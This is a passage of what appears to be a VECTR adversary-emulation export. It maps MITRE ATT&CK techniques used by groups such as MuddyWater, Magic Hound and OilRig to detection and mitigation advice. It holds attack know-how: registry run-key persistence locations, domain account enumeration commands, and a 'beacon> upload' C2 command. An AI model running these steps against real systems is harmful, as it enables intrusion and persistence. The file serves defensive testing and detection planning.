<code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has added Registry Run key <code>KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding</code> to establish persistence.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc","relationship--55d44c4e-c864-4e6f-ac33-62f13cd08f0e","relationship--9213f7ac-c548-4139-950b-5481a94570f9","course-of-action--8b36d944-f274-4d46-9acd-dbba6927ce7a","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Adamitis, D. et al. (2019, May 20). Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques. Retrieved June 5, 2019. https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html","Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Microsoft. (2018, August 20). Description of the RunOnceEx Registry Key. Retrieved June 29, 2018. https://support.microsoft.com/help/310593/description-of-the-runonceex-registry-key","Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014. http://msdn.microsoft.com/en-us/library/aa376977","Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018. https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/","Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016. https://technet.microsoft.com/en-us/sysinternals/bb963902","Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018. https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html"],"mitreId":"T1060"},"blueTeam":{"successfulDetectionBehaviors":["Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--6c002959-4493-43d6-995b-5d8522623389","vectrId":"6c002959-4493-43d6-995b-5d8522623389","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"6c002959-4493-43d6-995b-5d8522623389","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Multi-Stage Channels","variant":"MuddyWater - Multi-Stage Channels","objective":"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91","relationship--a3a7d091-49bb-4fd1-9442-d02e83a48ea1","relationship--3a348ba8-5608-4e9b-a180-f66cfad9896e","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--389854e8-32d1-406c-ab58-2ee2918bf7ed","course-of-action--514e7371-a344-4de7-8ec3-3aa42b801d52","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Adamitis, D. et al. (2019, May 20). Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques. Retrieved June 5, 2019. https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html"],"mitreId":"T1104"},"blueTeam":{"successfulDetectionBehaviors":["Use intrusion detection signatures to block traffic at network boundaries.","Command and control infrastructure used in a multi-stage channel may be blocked if known ahead of time. If unique signatures are present in the C2 traffic, they could also be used as the basis of identifying and blocking the channel. (Citation: University of Birmingham C2)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--6d096d28-7766-4e55-8ff5-4ffffc2faafb","vectrId":"6d096d28-7766-4e55-8ff5-4ffffc2faafb","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"6d096d28-7766-4e55-8ff5-4ffffc2faafb","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Commonly Used Port","variant":"Magic Hound - Commonly Used Port","objective":"Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware has communicated with C2 servers over port 6667 (for IRC) and port 8080.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.\n---\nConfigure internal and external firewalls to block traffic using common ports that associate to network protocols that may be unnecessary for that particular network segment.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e","relationship--bb784f1f-fb42-4587-9fe2-9dd5c8dffa5c","relationship--a34d1e30-dcf5-4743-93e5-e4834e980f0f","course-of-action--7c1796c7-9fc3-4c3e-9416-527295bf5d95","relationship--a1505946-76d9-4acb-8b1a-02c926915702","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--205b99bf-ce60-4bb5-8916-ac9d97ce4d05","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/"],"mitreId":"T1043"},"blueTeam":{"successfulDetectionBehaviors":["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use intrusion detection signatures to block traffic at network boundaries.","Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--6dbe13f5-af60-44aa-bc56-d6a4110a5b09","vectrId":"6dbe13f5-af60-44aa-bc56-d6a4110a5b09","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"6dbe13f5-af60-44aa-bc56-d6a4110a5b09","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Obfuscated Files or Information","variant":"MuddyWater - Obfuscated Files or Information","objective":"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.\n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)\n\nAnother example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used Daniel Bohannon’s Invoke-Obfuscation framework. The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands.Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10 to analyze commands after being processed/interpreted.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a","relationship--5c2cd95f-9c3a-4893-9a5f-960cfed62572","relationship--9d329c02-3b9f-42cc-b88b-bbacb3e4e18c","course-of-action--a09375e5-63d2-4b65-8b0d-1cfe3e6304ca","relationship--ffa8f46b-615f-4b95-8ed5-90f86eaedd20","course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017. https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/","Adamitis, D. et al. (2019, May 20). Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques. Retrieved June 5, 2019. https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html","Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018. https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html","Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018. https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf","Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018. https://github.com/danielbohannon/Revoke-Obfuscation","Bohannon, D.. (2017, March 13). Invoke-Obfuscation - PowerShell Obfuscator. Retrieved June 18, 2017. https://github.com/danielbohannon/Invoke-Obfuscation","Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018. https://github.com/itsreallynick/office-crackros","Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Lancaster, T.. (2017, November 14). Muddying the Water: Targeted Attacks in the Middle East. Retrieved March 15, 2018. https://researchcenter.paloaltonetworks.com/2017/11/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/","Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017. https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/","Saavedra-Morales, J., Sherstobitoff, R. (2018, January 6). Malicious Document Targets Pyeongchang Olympics. Retrieved April 10, 2018. https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/","Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018. https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html","Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018. https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/","White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018. https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/","Wikipedia. (2017, December 29). Duqu. Retrieved April 10, 2018. https://en.wikipedia.org/wiki/Duqu"],"mitreId":"T1027"},"blueTeam":{"successfulDetectionBehaviors":["Ensure logging and detection mechanisms analyze commands after being processed/interpreted, rather than the raw input. Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10 for this functionality. (Citation: Microsoft AMSI June 2015)\n\nMitigation of compressed and encrypted files sent over the network and through email may not be advised since it may impact normal operations.","Use signatures or heuristics to detect malicious software."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--6dd6a02b-48a4-4837-876b-493c2df7510d","vectrId":"6dd6a02b-48a4-4837-876b-493c2df7510d","name":"74","offset":0,"createTime":1.578425189436E12,"updateTime":1.57842570842E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"6dd6a02b-48a4-4837-876b-493c2df7510d","icon":"icons/firewall.svg","redTeam":{"trueAttackStartTimelineId":"","trueAttackEndTimelineId":"","status":"NotPerformed","method":"Exfiltration Over Command and Control Channel","variant":"Upload data over established HTTPS C2","objective":"Upload data to a compromised host over HTTPS tcp/443","command":"beacon> upload <file>","likelihood":"High","risk":"High","internalExternal":"Both","stealth":"High","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["9d8e81e7-127f-464e-8671-bfdc6cced3d5","ad215bfb-13dc-4cd4-9000-496851ca9d5f","ea1c3ab2-adbb-43d7-9c62-81c7c6574a5d"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":[],"mitreId":"T1105"},"blueTeam":{"successfulDetectionBehaviors":["Block C2 channels using network based intrusion prevention"],"expectedDetectionLayerIds":["35edd968-3417-4bb0-a3a8-43a3e710b4fa","3e014b51-0a62-44ad-86a7-9f27a3128196"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":"","alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--7073e478-de10-465e-92f1-3bc5d9e0461b","vectrId":"7073e478-de10-465e-92f1-3bc5d9e0461b","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"7073e478-de10-465e-92f1-3bc5d9e0461b","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Account Discovery","variant":"OilRig - Account Discovery - Net","objective":"Adversaries may attempt to get a listing of local system or domain accounts. \n\n### Windows\n\nExample commands that can acquire this information are <code>net user</code>, <code>net group <groupname></code>, and <code>net localgroup <groupname></code> using the [Net](https://attack.mitre.org/software/S0039) utility or through use of [dsquery](https://attack.mitre.org/software/S0105). If adversaries attempt to identify the primary user, currently logged in user, or set of users that commonly uses a system, [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) may apply.\n\n### Mac\n\nOn Mac, groups can be enumerated through the <code>groups</code> and <code>id</code> commands. In mac specifically, <code>dscl . list /Groups</code> and <code>dscacheutil -q group</code> can also be used to enumerate groups and users.\n\n### Linux\n\nOn Linux, local users can be enumerated through the use of the <code>/etc/passwd</code> file which is world readable. In mac, this same file is only used in single-user mode in addition to the <code>/etc/master.passwd</code> file.\n\nAlso, groups can be enumerated through the <code>groups</code> and <code>id</code> commands.\n\n### Office 365 and Azure AD\n\nWith authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance)\n\nAzure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) \n\nThe <code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)\n---\nThe [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. (Citation: Microsoft Net Utility)\n\n[Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, (Citation: Savill 1999) much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has run <code>net user</code>, <code>net user /domain</code>, <code>net group “domain admins” /domain</code>, and <code>net group “Exchange Trusted Subsystem” /domain</code> to get account listings on a victim.Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names. The Registry key is located <code>HKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators</code>. It can be disabled through GPO: Computer Configuration > [Policies] > Administrative Templates > Windows Components > Credential User Interface: E numerate administrator accounts on elevation.\n---\nCommands under <code>net user</code> can be used in [Net](https://attack.mitre.org/software/S0039) to gather information about and manipulate user accounts.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["b908f5c3-a12f-4e3f-b46e-6aa8a0b1aee3"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08","relationship--5f5af879-c239-416b-99ec-b46e2f9926a2","relationship--3d635b23-78b7-4de4-9417-8077787c7c0b","course-of-action--5c49bc54-9929-48ca-b581-7018219b5a97","relationship--620d641c-8f76-45f3-a86f-03dd28399d5c","course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3","tool--03342581-f790-4f03-ba41-e82e67392e23","relationship--15f74597-d92d-406f-9941-c0dfef3cb609","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Bullock, B.. (2016, October 3). Attacking Exchange with MailSniper. Retrieved October 6, 2019. https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/","Falcone, R. and Lee, B.. (2016, May 26). The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","Felch, M.. (2018, August 31). Red Teaming Microsoft Part 1 Active Directory Leaks via Azure. Retrieved October 6, 2019. https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/","Microsoft. (2006, October 18). Net.exe Utility. Retrieved September 22, 2015. https://msdn.microsoft.com/en-us/library/aa939914","Microsoft. (n.d.). Get-GlobalAddressList. Retrieved October 6, 2019. https://docs.microsoft.com/en-us/powershell/module/exchange/email-addresses-and-address-books/get-globaladdresslist","Microsoft. (n.d.). Get-MsolRoleMember. Retrieved October 6, 2019. https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrolemember?view=azureadps-1.0","Microsoft. (n.d.). az ad user. Retrieved October 6, 2019. https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest","Savill, J. (1999, March 4). Net.exe reference. Retrieved September 22, 2015. http://windowsitpro.com/windows/netexe-reference","Stringer, M.. (2018, November 21). RainDance. Retrieved October 6, 2019. https://github.com/True-Demon/raindance","UCF. (n.d.). The system must require username and password to elevate a running application.. Retrieved December 18, 2017. https://www.stigviewer.com/stig/microsoft_windows_server_2012_member_server/2013-07-25/finding/WN12-CC-000077"],"mitreId":"T1087"},"blueTeam":{"successfulDetectionBehaviors":["Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names. The Registry key is located <code>HKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators</code>. It can be disabled through GPO: Computer Configuration > [Policies] > Administrative Templates > Windows Components > Credential User Interface: E numerate administrator accounts on elevation. (Citation: UCF STIG Elevation Account Enumeration)\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)","Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--71de1618-2c48-4efb-ae78-d7ce79689915","vectrId":"71de1618-2c48-4efb-ae78-d7ce79689915","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"71de1618-2c48-4efb-ae78-d7ce79689915","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"File Deletion","variant":"Magic Hound - File Deletion","objective":"Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) has deleted and overwrote files to cover tracks.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--56fca983-1cf1-4fd1-bda0-5e170a37ab59","relationship--7f17927d-b371-42c4-bd68-0c5c57e3edab","relationship--8ff745b7-9985-4781-a8bc-dae6d71233d3","course-of-action--34efb2fd-4dc2-40d4-a564-0c147c85034d","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Mandiant. (2018). Mandiant M-Trends 2018. Retrieved July 9, 2018. https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf","Wilhoit, K. 